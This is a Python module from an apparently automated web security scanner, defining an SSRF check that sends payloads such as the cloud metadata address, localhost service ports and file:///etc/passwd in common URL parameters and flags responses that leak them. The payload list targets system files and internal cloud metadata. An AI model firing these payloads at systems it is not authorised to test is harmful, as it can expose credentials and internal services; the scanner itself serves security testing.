from typing import Optional
from urllib.parse import urlparse

from .base import BaseScanner
from .registry import register_scanner
from core.models import ScanTarget, Endpoint, Finding, ScannerManifest


SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "return", "return_to",
    "return_url", "go", "next", "file", "load", "read", "view",
    "document", "folder", "root", "img", "image", "src", "link",
    "show", "page", "feed", "host", "port", "proxy", "data",
    "reference", "site", "html", "location",
]

SSRF_PARAM_CHEKC = [
    ("url", "http://169.254.169.254/latest/meta-data/"),
    ("url", "http://127.0.0.1:22"),
    ("url", "http://127.0.0.1:3306"),
    ("url", "http://127.0.0.1:6379"),
    ("url", "http://[::1]:22"),
    ("file", "/etc/passwd"),
    ("file", "file:///etc/passwd"),
    ("load", "http://127.0.0.1:80"),
]


@register_scanner(manifest=ScannerManifest(
    name="ssrf_scanner",
    category="exploit",
    risk_level="aggressive",
    estimated_cost=40,
    produces_tag_patterns=["ssrf", "internal"],
))
class SSRFScanner(BaseScanner):
    @property
    def name(self) -> str:
        return "ssrf_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list[Finding], list[Endpoint]]:
        findings: list[Finding] = []
        endpoints: list[Endpoint] = []

        for param, value in SSRF_PARAM_CHEKC:
            try:
                resp = await self.request("GET", target.url, params={param: value}, timeout=15)
                body = resp.text.lower()

                indicators = []
                if "root:" in body or "nobody:" in body or "daemon:" in body:
                    indicators.append("passwd content")
                if "meta-data" in body or "instance-id" in body or "ami-id" in body:
                    indicators.append("cloud metadata")
                if "ssh" in body or "openssh" in body:
                    indicators.append("internal service banner")
                if "redis" in body or "mysql" in body:
                    indicators.append("internal service banner")

                if indicators:
                    findings.append(self.make_finding(
                        title="Server-Side Request Forgery (SSRF)",
                        description=f"Parameter '{param}={value}' caused server to fetch internal resource. "
                                    f"Indicators: {indicators}",
                        severity="critical",
                        endpoint=self.make_endpoint(target.url, discovered_by=self.name),
                        evidence={"parameter": param, "value": value,
                                  "indicators": indicators, "body_snippet": body[:300]},
                        confidence=0.8,
                        tags=["ssrf", "internal"],
                    ))
            except Exception:
                pass

        return findings, endpoints
